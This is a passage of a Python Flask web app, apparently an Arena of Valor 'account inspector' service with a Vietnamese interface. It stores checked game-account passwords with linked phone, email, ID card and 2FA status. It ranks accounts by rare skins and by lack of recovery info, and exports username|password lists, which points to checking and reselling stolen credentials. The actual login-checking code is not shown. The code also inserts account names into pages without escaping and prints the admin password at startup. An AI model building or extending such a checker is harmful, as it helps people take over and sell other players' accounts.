        sss_count = len(h.get("skins_sss", []))
        ss_count = len(h.get("skins_ss", []))
        anime_count = len(h.get("skins_anime", []))
        other_count = len(h.get("skins_other", []))
        total = sss_count + ss_count + anime_count + other_count
        lines.append("#" + "─" * 60)
        lines.append(f"# [{idx}] {tier_icon} ACC {tier}")
        lines.append(f"# UID: {h.get('uid','N/A')} | Nick: {h.get('nick','N/A') or 'Chưa đặt'}")
        lines.append(f"# Level: {h.get('level',0)} | Rank: {h.get('rank','N/A')} ({h.get('rank_stars',0)}★)")
        lines.append(f"# Sò: {h.get('shell',0)} | BAN: {'YES' if h.get('banned') else 'NO'}")
        lines.append(f"# SĐT: {h.get('mobile_no','') or 'Không có'} | Email: {h.get('email','') or 'Không có'}")
        lines.append(f"# CMND: {h.get('idcard','') or 'Chưa liên kết'} | 2FA: {'BẬT' if h.get('two_fa') else 'TẮT'}")
        lines.append(f"# Tổng Skin: {total}")
        lines.append(f"# Thời gian check: {h.get('time','')}")
        lines.append(f"# Acc: {h.get('acc','')}|{h.get('password','')}")
        if sss_count > 0:
            lines.append(f"#"); lines.append(f"# ⭐ SKIN SSS ({sss_count}):")
            for s in h.get("skins_sss", []): lines.append(f"#    ⭐ {s.get('hero','?')} → {s.get('skin','?')}")
        if anime_count > 0:
            lines.append(f"#"); lines.append(f"# 🎴 SKIN ANIME ({anime_count}):")
            for s in h.get("skins_anime", []): lines.append(f"#    🎴 {s.get('hero','?')} → {s.get('skin','?')}")
        if ss_count > 0:
            lines.append(f"#"); lines.append(f"# 💠 SKIN SS ({ss_count}):")
            for s in h.get("skins_ss", []): lines.append(f"#    💠 {s.get('hero','?')} → {s.get('skin','?')}")
        if other_count > 0:
            hero_counter = Counter(s.get("hero", "?") for s in h.get("skins_other", []))
            lines.append(f"#"); lines.append(f"# ▪ SKIN KHÁC ({other_count}):")
            for hero, count in hero_counter.most_common(): lines.append(f"#    ▪ {hero} × {count}")
        lines.append(""); lines.append(f"{h.get('acc','')}|{h.get('password','')}"); lines.append("")
    return "\n".join(lines)

@app.route("/export_results")
@login_required
def export_results():
    user = get_user()
    type_filter = request.args.get("type", "sss")
    hist = user.get("history", [])
    if type_filter == "sss":
        items = [h for h in hist if h.get("result") == "sss"]; fname = "acc_sss"; title = "DANH SÁCH ACC SSS"
    elif type_filter == "ss":
        items = [h for h in hist if h.get("result") == "ss"]; fname = "acc_ss"; title = "DANH SÁCH ACC SS"
    elif type_filter == "anime":
        items = [h for h in hist if h.get("result") == "anime"]; fname = "acc_anime"; title = "DANH SÁCH ACC ANIME"
    elif type_filter == "trang":
        items = [h for h in hist if h.get("result") == "trang"]; fname = "acc_trang_thong_tin"; title = "DANH SÁCH ACC TRẮNG THÔNG TIN"
    elif type_filter == "banned":
        items = [h for h in hist if h.get("result") == "banned"]; fname = "acc_ban"; title = "DANH SÁCH ACC BỊ BAN"
    elif type_filter == "all":
        items = [h for h in hist if h.get("result") in ("sss", "ss", "anime", "trang")]; fname = "acc_all_vip"; title = "DANH SÁCH ACC VIP"
    else:
        items = hist; fname = "acc_all"; title = "DANH SÁCH TẤT CẢ ACC"
    if not items:
        flash(f"Không có acc {type_filter.upper()} nào để xuất!", "error")
        return redirect(url_for("history"))
    file_content = build_export_lines(items, title, user)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{fname}_{timestamp}.txt"
    return Response(file_content.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={filename}", "Content-Type": "text/plain; charset=utf-8"})

@app.route("/export_vip_all")
@login_required
def export_vip_all():
    user = get_user()
    hist = user.get("history", [])
    sss_items = [h for h in hist if h.get("result") == "sss"]
    ss_items = [h for h in hist if h.get("result") == "ss"]
    anime_items = [h for h in hist if h.get("result") == "anime"]
    all_vip = sss_items + ss_items + anime_items
    if not all_vip:
        flash("Chưa có acc VIP nào để xuất!", "error")
        return redirect(url_for("history"))
    file_content = build_export_lines(all_vip, "DANH SÁCH ACC VIP (SSS + SS + ANIME)", user)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"acc_VIP_ALL_{timestamp}.txt"
    return Response(file_content.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={filename}", "Content-Type": "text/plain; charset=utf-8"})

@app.route("/export_tool")
@login_required
def export_tool():
    user = get_user()
    content = '''
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">📄</span> Tạo File Danh Sách Acc</h2>
        <form method="POST" action="/export_tool/download">
            <div class="form-group"><label class="form-label">Danh sách acc</label>
                <textarea name="accs" class="form-textarea" rows="15" placeholder="user1|pass1" required style="min-height:300px; font-size:0.85em;"></textarea></div>
            <div class="form-group"><label class="form-label">Tên file</label>
                <input type="text" name="filename" class="form-input" value="danh_sach_acc"></div>
            <button type="submit" class="btn btn-block">📥 Xuất File .txt</button>
        </form>
    </div>
    '''
    return render_page(content, active_tab="export", user=user)

@app.route("/export_tool/download", methods=["POST"])
@login_required
def export_tool_download():
    raw = request.form.get("accs", "").strip()
    filename = request.form.get("filename", "danh_sach_acc").strip()
    safe_name = "".join(c for c in filename if c.isalnum() or c in "_-") or "danh_sach_acc"
    if not raw:
        flash("Chưa nhập acc nào!", "error"); return redirect(url_for("export_tool"))
    lines = []; valid = 0
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        parsed = None
        for sep in ['|', ':', ' ']:
            if sep in line:
                parts = line.split(sep, 1)
                if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                    parsed = (parts[0].strip(), parts[1].strip()); break
        if parsed:
            lines.append(f"{parsed[0]}|{parsed[1]}"); valid += 1
    if valid == 0:
        flash("Không có acc hợp lệ nào!", "error"); return redirect(url_for("export_tool"))
    file_content = "\n".join(lines)
    return Response(file_content.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={safe_name}.txt", "Content-Type": "text/plain; charset=utf-8"})

@app.route("/export_tool/sample")
def export_tool_sample():
    sample = "# Mỗi dòng 1 acc: user|pass\n\nuser1|pass1\nuser2|pass2\n"
    return Response(sample.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": "attachment; filename=MAU_danh_sach_acc.txt", "Content-Type": "text/plain; charset=utf-8"})

@app.route("/history")
@login_required
def history():
    user = get_user()
    tab = request.args.get("tab", "all")
    hist = user.get("history", [])[::-1]
    if tab == "sss": filtered = [h for h in hist if h.get("result") == "sss"]
    elif tab == "ss": filtered = [h for h in hist if h.get("result") == "ss"]
    elif tab == "anime": filtered = [h for h in hist if h.get("result") == "anime"]
    elif tab == "trang": filtered = [h for h in hist if h.get("result") == "trang"]
    elif tab == "vip": filtered = [h for h in hist if h.get("result") in ("sss", "ss", "anime")]
    else: filtered = hist
    counts = {"all": len(hist),
        "sss": sum(1 for h in hist if h.get("result") == "sss"),
        "ss": sum(1 for h in hist if h.get("result") == "ss"),
        "anime": sum(1 for h in hist if h.get("result") == "anime"),
        "trang": sum(1 for h in hist if h.get("result") == "trang")}
    counts["vip"] = counts["sss"] + counts["ss"] + counts["anime"]
    export_btn = ""
    if tab == "vip":
        export_btn = f'<a href="/export_vip_all" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 XUẤT VIP ALL - {counts["vip"]} acc</a>'
    elif tab in ("sss", "ss", "anime", "trang"):
        export_btn = f'<a href="/export_results?type={tab}" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 Xuất File {tab.upper()}</a>'
    elif tab == "all":
        export_btn = '<a href="/export_vip_all" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 Xuất Tất Cả VIP</a>'
    rows = ""
    if filtered:
        for h in filtered[:200]:
            color = {"sss": "#ffb800", "ss": "#00f0ff", "anime": "#e040fb", "normal": "#8b8b9a",
                     "trang": "#a0a0b8", "banned": "#ff2951", "failed": "#5a5a6e"}.get(h.get("result", ""), "#8b8b9a")
            hid = h.get("id", "")
            if hid:
                total_sk = h.get("total_skins", 0)
                rows += f'''<a href="/history/{hid}" class="list-item">
                    <div style="flex:1; min-width:0;"><div style="font-family:'Share Tech Mono',monospace; font-weight:600; overflow:hidden; text-overflow:ellipsis;">{h['acc']}</div>
                    <div style="font-size:0.72em; color:var(--text-mute);">{h['time']} · {total_sk} skin</div></div>
                    <div style="padding:4px 12px; background:{color}20; color:{color}; border-radius:8px; font-size:0.72em; font-weight:800; text-transform:uppercase; font-family:'Orbitron',sans-serif; border:1px solid {color}40;">{h['result']}</div>
                    <div style="color:var(--text-mute); font-size:1.2em;">›</div></a>'''
    else:
        rows = f'<p style="text-align:center; color:var(--text-dim); padding:20px;">Chưa có dữ liệu</p>'
    content = f'''
    <div class="card"><h2 class="card-title"><span class="card-title-icon">▤</span> Lịch Sử Check</h2></div>
    <div class="tab-bar">
        <a href="/history?tab=all" class="tab-item {'active' if tab == 'all' else ''}">▤ Tất Cả ({counts['all']})</a>
        <a href="/history?tab=vip" class="tab-item {'active' if tab == 'vip' else ''}">★ VIP ({counts['vip']})</a>
        <a href="/history?tab=sss" class="tab-item sss-tab {'active' if tab == 'sss' else ''}">◈ SSS ({counts['sss']})</a>
        <a href="/history?tab=ss" class="tab-item ss-tab {'active' if tab == 'ss' else ''}">◆ SS ({counts['ss']})</a>
        <a href="/history?tab=anime" class="tab-item anime-tab {'active' if tab == 'anime' else ''}">◇ Anime ({counts['anime']})</a>
        <a href="/history?tab=trang" class="tab-item trang-tab {'active' if tab == 'trang' else ''}">○ Trắng ({counts['trang']})</a>
    </div>
    {export_btn}
    <div class="card"><h3 class="card-title" style="font-size:0.95em;">({len(filtered)})</h3>{rows}</div>
    '''
    return render_page(content, active_tab="history", user=user)

@app.route("/history/<hid>")
@login_required
def history_detail(hid):
    user = get_user()
    entry = None
    for h in user.get("history", []):
        if h.get("id") == hid: entry = h; break
    if not entry:
        flash("Không tìm thấy!", "error"); return redirect(url_for("history"))
    t = entry.get("result", "unknown")
    tier_colors = {"sss": ("#ffb800", "◈", "SSS"), "ss": ("#00f0ff", "◆", "SS"),
                   "anime": ("#e040fb", "◇", "ANIME"), "normal": ("#8b8b9a", "▪", "THƯỜNG"),
                   "trang": ("#a0a0b8", "○", "TRẮNG TT"), "banned": ("#ff2951", "✖", "BANNED"),
                   "failed": ("#5a5a6e", "✕", "LỖI")}
    color, icon, tier_label = tier_colors.get(t, ("#8b8b9a", "?", t.upper()))
    acc_text = entry.get("acc", ""); pwd_text = entry.get("password", "")
    cred_box = f'''<div class="cred-box"><div class="cred-label">◈ Tài khoản</div><div class="cred-value" onclick="copyText(this)">{acc_text}</div>
    <div class="cred-label">◈ Mật khẩu</div><div class="cred-value" onclick="copyText(this)">{pwd_text}</div></div>'''
    sss_list = entry.get("skins_sss", []); ss_list = entry.get("skins_ss", [])
    anime_list = entry.get("skins_anime", []); other_list = entry.get("skins_other", [])
    total_skins = len(sss_list) + len(ss_list) + len(anime_list) + len(other_list)
    def html_skins(lst, cls, ico, label):
        if not lst: return ""
        tags = "".join(f'<span class="skin-tag {cls}">{ico} {s["hero"]} → {s["skin"]}</span>' for s in lst)
        return f'<div class="card"><h3 class="card-title" style="font-size:0.95em;">{ico} {label} ({len(lst)})</h3><div>{tags}</div></div>'
    sss_html = html_skins(sss_list, "skin-sss", "⭐", "SKIN SSS")
    anime_html = html_skins(anime_list, "skin-anime", "🎴", "SKIN ANIME")
    ss_html = html_skins(ss_list, "skin-ss", "💠", "SKIN SS")
    other_html = ""
    if other_list:
        hero_counter = Counter(s["hero"] for s in other_list)
        chips = "".join(f'<span class="skin-tag skin-normal">▪ {hero} × {count}</span>' for hero, count in hero_counter.most_common())
        other_html = f'<div class="card"><h3 class="card-title" style="font-size:0.95em;">▪ SKIN KHÁC ({len(other_list)})</h3><div>{chips}</div></div>'
    banner = f'''<div class="card" style="text-align:center; border:2px solid {color};">
        <div style="font-size:4em; color:{color};">{icon}</div>
        <div style="font-family:'Orbitron',sans-serif; font-size:1.8em; font-weight:900; color:{color};">{tier_label}</div>
        <div style="font-size:0.75em; color:var(--text-mute); margin-top:8px;">{entry["time"]}</div></div>'''
    banned_text = '<span style="color:#ff2951; font-weight:700;">🔴 BANNED</span>' if entry.get("banned") else '<span style="color:#00ff88; font-weight:700;">🟢 CLEAN</span>'
    phone_val = entry.get('mobile_no', '') or ''; email_val = entry.get('email', '') or ''
    idcard_val = entry.get('idcard', '') or ''; two_fa_val = 'BẬT' if entry.get('two_fa') else 'TẮT'
    info_card = f'''<div class="card"><h3 class="card-title">◐ Thông Tin Acc</h3>
        <div class="info-row"><span class="info-label">UID</span><span class="info-value">{entry.get("uid") or "N/A"}</span></div>
        <div class="info-row"><span class="info-label">Nickname</span><span class="info-value">{entry.get("nick") or "Chưa đặt"}</span></div>
        <div class="info-row"><span class="info-label">SĐT</span><span class="info-value">{phone_val if phone_val else "Không có"}</span></div>
        <div class="info-row"><span class="info-label">Email</span><span class="info-value">{email_val if email_val else "Không có"}</span></div>
        <div class="info-row"><span class="info-label">CMND</span><span class="info-value">{idcard_val if idcard_val else "Chưa liên kết"}</span></div>
        <div class="info-row"><span class="info-label">2FA</span><span class="info-value">{two_fa_val}</span></div>
        <div class="info-row"><span class="info-label">Rank</span><span class="info-value">{entry.get("rank") or "Chưa xếp hạng"} ({entry.get("rank_stars", 0)}★)</span></div>
        <div class="info-row"><span class="info-label">Level</span><span class="info-value">{entry.get("level", 0)}</span></div>
        <div class="info-row"><span class="info-label">Sò</span><span class="info-value">{entry.get("shell", 0)}</span></div>
        <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{banned_text}</span></div>
        <div class="info-row"><span class="info-label">Tổng Skin</span><span class="info-value">{total_skins}</span></div></div>'''
    copy_js = '<script>function copyText(el){var txt=el.textContent;if(navigator.clipboard){navigator.clipboard.writeText(txt).then(function(){el.style.background="rgba(0,255,136,0.2)";setTimeout(function(){el.style.background="rgba(0,0,0,0.5)";},800);});}}</script>'
    content = f'<div style="margin-bottom:14px;"><a href="/history" class="btn btn-secondary btn-sm" style="width:auto;">← Quay Lại</a></div>{banner}{cred_box}{info_card}{sss_html}{anime_html}{ss_html}{other_html}{copy_js}'
    return render_page(content, active_tab="history", user=user)

@app.route("/enter_code", methods=["GET", "POST"])
@login_required
def enter_code():
    user = get_user()
    if request.method == "POST":
        code = request.form.get("code", "").strip().upper()
        if code in GENERATED_KEYS:
            k = GENERATED_KEYS[code]
            if k["remaining_uses"] > 0:
                k["remaining_uses"] -= 1
                if k.get("type") == "day": user["temp_balance"] = user.get("temp_balance", 0) + k["check_count"]
                else: user["balance"] = user.get("balance", 0) + k["check_count"]
                if k["remaining_uses"] <= 0: del GENERATED_KEYS[code]
                save_data(); flash(f"+{k['check_count']} lượt!", "success")
            else: flash("Code đã hết lượt!", "error")
        else: flash("Code không hợp lệ!", "error")
    content = '''<div class="card"><h2 class="card-title">◆ Nhập Code</h2><form method="POST">
        <div class="form-group"><label class="form-label">Mã Code</label><input type="text" name="code" class="form-input" required style="text-transform:uppercase;"></div>
        <button type="submit" class="btn btn-success btn-block">Xác Nhận</button></form></div>'''
    return render_page(content, active_tab="code", user=user)

@app.route("/tu_tien", methods=["GET"])
@login_required
def tu_tien():
    user = get_user()
    cul = user.get("cultivation", {})
    lvl = cul.get("level", 0)
    lvl_name = CULTIVATION_LEVELS[lvl]["name"] if lvl < len(CULTIVATION_LEVELS) else "MAX"
    mp_name = MON_PHAI[cul["mon_phai"]]["name"] if cul.get("mon_phai") else "Chưa có"
    action = request.args.get("action", "main")
    body = ""
    if action == "tuluyen":
        body = '<div class="card"><h3 class="card-title">⚡ Tu Luyện</h3><form method="POST" action="/tu_tien/tuluyen"><button type="submit" class="btn btn-block">Tu Luyện Ngay</button></form></div>'
    elif action == "vukhi":
        rows = ""
        for wid, w in VU_KHI.items():
            rows += f'<div class="list-item"><div><div style="font-weight:700;">{w["name"]}</div><div style="font-size:0.8em;">ATK +{w["atk"]}</div></div><form method="POST" action="/tu_tien/vukhi/buy" style="margin:0;"><input type="hidden" name="weapon_id" value="{wid}"><button type="submit" class="btn btn-sm">Mua {w["cost"]}</button></form></div>'
        body = f'<div class="card"><h3 class="card-title">⚡ Vũ Khí</h3>{rows}</div>'
    elif action == "monphai":
        if cul.get("mon_phai"):
            mp = MON_PHAI[cul["mon_phai"]]
            cost = (cul.get("mon_phai_level", 0) + 1) * 50
            body = f'<div class="card"><h3 class="card-title">⛩ Môn Phái</h3><div class="info-row"><span class="info-label">Môn phái</span><span class="info-value">{mp["name"]}</span></div><div class="info-row"><span class="info-label">Cấp</span><span class="info-value">{cul.get("mon_phai_level", 0) + 1}</span></div><form method="POST" action="/tu_tien/monphai/upgrade"><button type="submit" class="btn btn-block">Nâng Cấp ({cost} Lượt)</button></form></div>'
        else:
            cards = ""
            for mid, mp in MON_PHAI.items():
                cards += f'<form method="POST" action="/tu_tien/monphai/join" style="margin-bottom:10px;"><input type="hidden" name="mp_id" value="{mid}"><button type="submit" class="btn btn-secondary btn-block">{mp["name"]} (+ATK:{mp["bonus_atk"]})</button></form>'
            body = f'<div class="card"><h3 class="card-title">⛩ Chọn Môn Phái</h3>{cards}</div>'
    else:
        body = f'<div class="card"><h2 class="card-title">⚔ Tu Tiên Giới</h2><div class="stat-grid"><div class="stat-box"><div class="stat-value" style="font-size:1.1em;">{lvl_name}</div><div class="stat-label">Cảnh Giới</div></div><div class="stat-box"><div class="stat-value" style="font-size:1.1em;">{cul.get("exp", 0)}</div><div class="stat-label">EXP</div></div><div class="stat-box"><div class="stat-value" style="font-size:1.1em;">{cul.get("hp", 0)}</div><div class="stat-label">HP</div></div><div class="stat-box"><div class="stat-value" style="font-size:1.1em;">{cul.get("atk", 0)}</div><div class="stat-label">ATK</div></div><div class="stat-box"><div class="stat-value" style="font-size:1.1em;">{cul.get("def", 0)}</div><div class="stat-label">DEF</div></div><div class="stat-box"><div class="stat-value" style="font-size:1.1em;">{mp_name}</div><div class="stat-label">Môn Phái</div></div></div><div style="margin-top:14px;"><a href="/tu_tien?action=tuluyen" class="btn btn-block" style="margin-bottom:8px;">⚡ Tu Luyện</a><a href="/tu_tien?action=vukhi" class="btn btn-secondary btn-block" style="margin-bottom:8px;">⚡ Vũ Khí</a><a href="/tu_tien?action=monphai" class="btn btn-secondary btn-block">⛩ Môn Phái</a></div></div>'
    return render_page(body, active_tab="tu_tien", user=user)

@app.route("/tu_tien/tuluyen", methods=["POST"])
@login_required
def tu_tien_tuluyen():
    user = get_user()
    cul = user["cultivation"]
    if cul["level"] >= len(CULTIVATION_LEVELS) - 1:
        flash("Đã đạt cảnh giới cao nhất!", "success")
    else:
        gain = random.randint(10, 30) + cul["level"] * 5
        cul["exp"] = cul.get("exp", 0) + gain
        while cul["level"] < len(CULTIVATION_LEVELS) - 1 and cul["exp"] >= CULTIVATION_LEVELS[cul["level"] + 1]["exp"]:
            cul["level"] += 1
            cul["hp"] = CULTIVATION_LEVELS[cul["level"]]["hp"]
            cul["atk"] = CULTIVATION_LEVELS[cul["level"]]["atk"]
            cul["def"] = CULTIVATION_LEVELS[cul["level"]]["def"]
            flash(f"Đột phá! {CULTIVATION_LEVELS[cul['level']]['name']}", "success")
        flash(f"+{gain} EXP", "success")
        save_data()
    return redirect(url_for("tu_tien", action="tuluyen"))

@app.route("/tu_tien/vukhi/buy", methods=["POST"])
@login_required
def tu_tien_buy_weapon():
    user = get_user()
    wid = request.form.get("weapon_id", "")
    if wid in VU_KHI:
        w = VU_KHI[wid]
        if user["balance"] < w["cost"]: flash("Không đủ lượt!", "error")
        else:
            user["balance"] -= w["cost"]
            user["cultivation"]["weapon"] = wid
            save_data(); flash(f"Đã mua {w['name']}!", "success")
    return redirect(url_for("tu_tien", action="vukhi"))

@app.route("/tu_tien/monphai/join", methods=["POST"])
@login_required
def tu_tien_join_monphai():
    user = get_user()
    mid = request.form.get("mp_id", "")
    if mid in MON_PHAI:
        user["cultivation"]["mon_phai"] = mid
        user["cultivation"]["mon_phai_level"] = 0
        save_data(); flash(f"Đã gia nhập {MON_PHAI[mid]['name']}!", "success")
    return redirect(url_for("tu_tien", action="monphai"))

@app.route("/tu_tien/monphai/upgrade", methods=["POST"])
@login_required
def tu_tien_upgrade_monphai():
    user = get_user()
    cul = user["cultivation"]
    if not cul.get("mon_phai"): flash("Chưa gia nhập!", "error")
    else:
        cost = (cul.get("mon_phai_level", 0) + 1) * 50
        if user["balance"] < cost: flash(f"Cần {cost} lượt!", "error")
        else:
            user["balance"] -= cost
            cul["mon_phai_level"] = cul.get("mon_phai_level", 0) + 1
            save_data(); flash("Nâng cấp thành công!", "success")
    return redirect(url_for("tu_tien", action="monphai"))

@app.route("/profile")
@login_required
def profile():
    user = get_user()
    cul = user.get("cultivation", {})
    lvl_name = CULTIVATION_LEVELS[cul.get("level", 0)]["name"] if cul.get("level", 0) < len(CULTIVATION_LEVELS) else "MAX"
    last_ci = user.get("last_checkin", 0)
    now = time.time()
    can_checkin = now - last_ci >= 86400
    ci_status = "Có thể điểm danh" if can_checkin else f"Còn {int(86400 - (now - last_ci)) // 3600}h"
    hist = user.get("history", [])
    count_sss = sum(1 for h in hist if h.get("result") == "sss")
    count_ss = sum(1 for h in hist if h.get("result") == "ss")
    count_anime = sum(1 for h in hist if h.get("result") == "anime")
    count_trang = sum(1 for h in hist if h.get("result") == "trang")
    content = f'''
    <div class="card"><h2 class="card-title">◐ Thông Tin Cá Nhân</h2>
        <div class="info-row"><span class="info-label">Username</span><span class="info-value">{user['username']} {'👑' if user.get('is_admin') else ''}</span></div>
        <div class="info-row"><span class="info-label">ID</span><span class="info-value" style="font-family:monospace;">{user['id']}</span></div>
        <div class="info-row"><span class="info-label">Số dư</span><span class="info-value">{user.get('balance', 0)}</span></div>
        <div class="info-row"><span class="info-label">Đã mời</span><span class="info-value">{user.get('referrals', 0)}</span></div>
        <div class="info-row"><span class="info-label">Cảnh giới</span><span class="info-value">{lvl_name}</span></div></div>
    <div class="card"><h2 class="card-title">★ Kho Acc Đã Check</h2>
        <div class="stat-grid-4">
            <a href="/history?tab=sss" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{count_sss}</div><div class="stat-label">◈ SSS</div></a>
            <a href="/history?tab=ss" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{count_ss}</div><div class="stat-label">◆ SS</div></a>
            <a href="/history?tab=anime" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{count_anime}</div><div class="stat-label">◇ Anime</div></a>
            <a href="/history?tab=trang" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{count_trang}</div><div class="stat-label">○ Trắng</div></a>
        </div>
        <div style="margin-top:14px;"><a href="/export_vip_all" class="btn btn-success btn-block">📥 XUẤT VIP ALL</a></div></div>
    <div class="card"><h2 class="card-title">◉ Điểm Danh</h2>
        <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{ci_status}</span></div>
        <div class="info-row"><span class="info-label">Phần thưởng</span><span class="info-value">+{DAILY_REWARD} lượt</span></div>
        <form method="POST" action="/daily" style="margin-top:14px;"><button type="submit" class="btn btn-success btn-block" {'disabled' if not can_checkin else ''}>{'✓ Điểm Danh' if can_checkin else '◷ Đã Điểm Danh'}</button></form></div>'''
    return render_page(content, active_tab="profile", user=user)

@app.route("/daily", methods=["POST"])
@login_required
def daily():
    user = get_user()
    now = time.time()
    if now - user.get("last_checkin", 0) < 86400:
        flash("Đã điểm danh hôm nay!", "error")
    else:
        user["balance"] += DAILY_REWARD
        user["last_checkin"] = now
        save_data(); flash(f"+{DAILY_REWARD} lượt!", "success")
    return redirect(url_for("profile"))

@app.route("/notifications")
@login_required
def notifications():
    user = get_user()
    mark_read()
    items = ""
    for n in reversed(NOTIFICATIONS):
        items += f'<div class="card"><div style="font-weight:700;">{n["title"]}</div><div style="font-size:0.72em; color:var(--text-mute);">{n["time"]} · {n["admin"]}</div><div style="white-space:pre-wrap;">{n["content"]}</div></div>'
    if not items: items = '<div class="card"><p style="text-align:center;">Chưa có thông báo</p></div>'
    return render_page(f'<div class="card"><h2 class="card-title">◉ Thông Báo</h2></div>{items}', active_tab="notif", user=user)

@app.route("/admin")
@admin_required
def admin_panel():
    user = get_user()
    tab = request.args.get("tab", "stats")
    body = ""
    if tab == "users":
        rows = ""
        for un, u in USERS.items():
            rows += f'<div class="list-item"><div>{un} {"👑" if u.get("is_admin") else ""}</div><form method="POST" action="/admin/add_balance" style="display:flex; gap:4px;"><input type="hidden" name="username" value="{un}"><input type="number" name="amount" placeholder="+/-" class="form-input" style="width:80px; padding:4px;"><button type="submit" class="btn btn-sm">+</button></form></div>'
        body = f'<div class="card"><h3 class="card-title">◐ Users ({len(USERS)})</h3>{rows}</div>'
    elif tab == "keys":
        rows = ""
        for k, v in GENERATED_KEYS.items():
            rows += f'<div class="list-item"><div><div style="font-family:monospace; color:#00f0ff;">{k}</div><div style="font-size:0.72em;">{v["type"]} · còn {v["remaining_uses"]} · +{v["check_count"]}</div></div><form method="POST" action="/admin/delete_key" style="margin:0;"><input type="hidden" name="key" value="{k}"><button type="submit" class="btn btn-sm btn-danger">✕</button></form></div>'
        body = f'<div class="card"><h3 class="card-title">◆ Tạo Key</h3><form method="POST" action="/admin/create_key"><div class="form-group"><label class="form-label">Tên key</label><input type="text" name="name" class="form-input" required></div><div class="form-group"><label class="form-label">Lượt check</label><input type="number" name="check_count" class="form-input" required min="1"></div><div class="form-group"><label class="form-label">Lượt nhập</label><input type="number" name="uses" class="form-input" required min="1"></div><div class="form-group"><label class="form-label">Loại</label><select name="key_type" class="form-input"><option value="forever">Vĩnh viễn</option><option value="day">Theo ngày</option></select></div><button type="submit" class="btn btn-block">Tạo Key</button></form></div><div class="card"><h3 class="card-title">◈ Keys ({len(GENERATED_KEYS)})</h3>{rows or "Chưa có"}</div>'
    elif tab == "notif":
        body = '<div class="card"><h3 class="card-title">◉ Gửi Thông Báo</h3><form method="POST" action="/admin/send_notification"><div class="form-group"><label class="form-label">Tiêu đề</label><input type="text" name="title" class="form-input" required></div><div class="form-group"><label class="form-label">Nội dung</label><textarea name="content" class="form-textarea" required></textarea></div><button type="submit" class="btn btn-warning btn-block">Gửi</button></form></div>'
    else:
        body = f'<div class="card"><h2 class="card-title">◈ Thống Kê</h2><div class="stat-grid"><div class="stat-box"><div class="stat-value">{len(USERS)}</div><div class="stat-label">Users</div></div><div class="stat-box"><div class="stat-value">{len(GENERATED_KEYS)}</div><div class="stat-label">Keys</div></div></div></div><div class="card"><h3 class="card-title">⚡ Cộng Lượt Tất Cả</h3><form method="POST" action="/admin/add_all"><div class="form-group"><input type="number" name="amount" class="form-input" required></div><button type="submit" class="btn btn-warning btn-block">Cộng</button></form></div>'
    content = f'<div class="tab-bar"><a href="/admin" class="tab-item {"active" if tab == "stats" else ""}">◈ Stats</a><a href="/admin?tab=users" class="tab-item {"active" if tab == "users" else ""}">◐ Users</a><a href="/admin?tab=keys" class="tab-item {"active" if tab == "keys" else ""}">◆ Keys</a><a href="/admin?tab=notif" class="tab-item {"active" if tab == "notif" else ""}">◉ T.Báo</a></div>{body}'
    return render_page(content, active_tab="", user=user)

@app.route("/admin/create_key", methods=["POST"])
@admin_required
def admin_create_key():
    name = request.form.get("name", "").strip().upper()
    try: cc = int(request.form.get("check_count", 0)); us = int(request.form.get("uses", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="keys"))
    if not name or cc <= 0 or us <= 0:
        flash("Dữ liệu không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="keys"))
    kt = request.form.get("key_type", "forever")
    key = name
    if key in GENERATED_KEYS: key = f"{name}_{int(time.time())}"
    GENERATED_KEYS[key] = {"name": name, "remaining_uses": us, "check_count": cc, "created_by": session["username"], "type": kt, "created_at": time.time()}
    save_data(); flash(f"Đã tạo key: {key}", "success")
    return redirect(url_for("admin_panel", tab="keys"))

@app.route("/admin/delete_key", methods=["POST"])
@admin_required
def admin_delete_key():
    k = request.form.get("key", "")
    if k in GENERATED_KEYS: del GENERATED_KEYS[k]; save_data(); flash("Đã xóa", "success")
    return redirect(url_for("admin_panel", tab="keys"))

@app.route("/admin/add_balance", methods=["POST"])
@admin_required
def admin_add_balance():
    un = request.form.get("username", "")
    try: amt = int(request.form.get("amount", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="users"))
    if un in USERS: USERS[un]["balance"] = USERS[un].get("balance", 0) + amt; save_data(); flash(f"+{amt} cho {un}", "success")
    return redirect(url_for("admin_panel", tab="users"))

@app.route("/admin/add_all", methods=["POST"])
@admin_required
def admin_add_all():
    try: amt = int(request.form.get("amount", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel"))
    for u in USERS.values(): u["balance"] = u.get("balance", 0) + amt
    save_data(); flash(f"+{amt} cho {len(USERS)} users", "success")
    return redirect(url_for("admin_panel"))

@app.route("/admin/send_notification", methods=["POST"])
@admin_required
def admin_send_notification():
    t = request.form.get("title", "").strip(); c = request.form.get("content", "").strip()
    if not t or not c: flash("Nhập đầy đủ!", "error"); return redirect(url_for("admin_panel", tab="notif"))
    notif = {"id": uuid.uuid4().hex[:10], "title": t, "content": c, "admin": session["username"], "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "timestamp": time.time()}
    NOTIFICATIONS.append(notif)
    if len(NOTIFICATIONS) > 200: NOTIFICATIONS.pop(0)
    save_data(); flash(f"Đã gửi: {t}", "success")
    return redirect(url_for("admin_panel", tab="notif"))

if __name__ == "__main__":
    load_data()
    create_admin()
    print("=" * 60)
    print("◈ AOV INSPECTOR - ULTIMATE MEGA EDITION")
    print("=" * 60)
    print(f"👑 Admin: {ADMIN_USERNAME} / {ADMIN_PASSWORD}")
